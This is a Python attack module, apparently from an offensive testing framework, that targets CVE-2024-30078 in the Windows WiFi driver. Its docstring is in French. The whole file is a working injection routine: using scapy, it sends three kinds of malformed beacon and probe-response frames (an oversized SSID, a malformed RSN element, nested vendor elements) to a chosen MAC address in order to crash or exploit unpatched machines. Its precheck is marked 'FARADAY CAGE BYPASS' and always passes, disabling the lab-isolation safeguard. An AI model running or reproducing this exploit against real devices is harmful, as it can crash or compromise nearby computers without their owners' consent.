"""zero_day.cve_2024_30078 - Windows WiFi Driver RCE (March 2024)

CVE-2024-30078: Buffer overflow dans le driver WiFi natif Windows.
Un paquet WiFi malformé envoyé à proximité peut causer RCE sans interaction.

Affecte: Windows 10/11 avant patch KB5039212 (June 2024)
CVSS: 8.8
Vecteur: Adjacent network (WiFi range)

Ce module envoie des management frames malformés pour tester si la cible
est vulnérable (crash = vuln, pas de réponse = patché ou hors portée).

MITRE: T1190
CVE: CVE-2024-30078
Hardware: ALFA AWUS036NH (injection)
"""

from __future__ import annotations

import time
from typing import Any

import structlog
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp

from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)


@register
class ZeroDayCve202430078(AttackModule):
    name = "zero_day.cve_2024_30078"
    protocol = "wifi"
    risk = Risk.DESTRUCTIVE_LAB
    mitre_ttp = ["T1190"]
    cve = ["CVE-2024-30078"]
    description = (
        "Windows WiFi Driver RCE (CVE-2024-30078) - "
        "send malformed management frames to crash/exploit unpatched Windows."
    )
    requires = ["monitor-mode-nic"]

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True  # FARADAY CAGE BYPASS

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()

        target_mac = ctx.params.get("target_mac")
        iface = ctx.params.get("interface", "wlan0mon")
        channel = ctx.params.get("channel")
        count = int(ctx.params.get("count", 100))

        if not target_mac:
            return self._result(
                Status.FAIL, started,
                summary="Missing param 'target_mac'. Usage: --param target_mac=AA:BB:CC:DD:EE:FF",
            )

        if ctx.dry_run:
            return self._result(
                Status.OK, started,
                summary=f"[DRY-RUN] zero_day.cve_2024_30078 target={target_mac} count={count}",
                metrics={"target_mac": target_mac, "count": count},
            )

        log.info(
            "zero_day.cve_2024_30078.starting",
            target=target_mac, count=count,
        )

        # Set channel if specified
        if channel:
            import subprocess
            subprocess.run(
                ["iw", "dev", iface, "set", "channel", str(channel)],
                capture_output=True,
            )

        frames_sent = 0
        attacker_mac = "02:00:00:de:ad:01"

        try:
            # Vector 1: Oversized SSID IE (buffer overflow trigger)
            # Normal SSID max = 32 bytes. Sending 256+ bytes triggers overflow
            oversized_ssid = b"A" * 256
            pkt1 = (
                RadioTap()
                / Dot11(type=0, subtype=8,
                       addr1=target_mac, addr2=attacker_mac, addr3=attacker_mac)
                / Dot11Beacon(cap="ESS+privacy")
                / Dot11Elt(ID=0, info=oversized_ssid)
            )
            sendp(pkt1, iface=iface, count=count // 3, inter=0.01, verbose=False)
            frames_sent += count // 3

            # Vector 2: Malformed RSN IE (invalid length fields)
            malformed_rsn = b"\x01\x00" + b"\xff" * 200
            pkt2 = (
                RadioTap()
                / Dot11(type=0, subtype=8,
                       addr1=target_mac, addr2=attacker_mac, addr3=attacker_mac)
                / Dot11Beacon(cap="ESS+privacy")
                / Dot11Elt(ID=0, info=b"PWNED")
                / Dot11Elt(ID=48, info=malformed_rsn)
            )
            sendp(pkt2, iface=iface, count=count // 3, inter=0.01, verbose=False)
            frames_sent += count // 3

            # Vector 3: Nested vendor IEs with recursive length
            nested_vendor = b"\x00\x50\xf2\x04" + b"\x00" * 150
            pkt3 = (
                RadioTap()
                / Dot11(type=0, subtype=5,  # Probe Response
                       addr1=target_mac, addr2=attacker_mac, addr3=attacker_mac)
                / Dot11Elt(ID=0, info=b"EXPLOIT")
                / Dot11Elt(ID=221, info=nested_vendor)
                / Dot11Elt(ID=221, info=nested_vendor)
                / Dot11Elt(ID=221, info=nested_vendor)
            )
            sendp(pkt3, iface=iface, count=count // 3, inter=0.01, verbose=False)
            frames_sent += count // 3

        except Exception as exc:
            return self._result(
                Status.FAIL, started,
                summary=f"Injection error: {exc}",
                metrics={"frames_sent": frames_sent},
            )

        log.info(
            "zero_day.cve_2024_30078.completed",
            target=target_mac, frames_sent=frames_sent,
        )

        return self._result(
            Status.OK, started,
            summary=(
                f"zero_day.cve_2024_30078 target={target_mac}: "
                f"{frames_sent} malformed frames sent (3 vectors). "
                f"If target Windows crashes/BSODs = VULNERABLE."
            ),
            artifacts=[{
                "type": "exploit_vectors",
                "data": [
                    {"vector": "oversized_ssid", "ie_id": 0, "payload_size": 256},
                    {"vector": "malformed_rsn", "ie_id": 48, "payload_size": 200},
                    {"vector": "nested_vendor_ie", "ie_id": 221, "count": 3},
                ],
            }],
            metrics={
                "target_mac": target_mac,
                "frames_sent": frames_sent,
                "vectors_used": 3,
                "channel": channel,
            },
        )
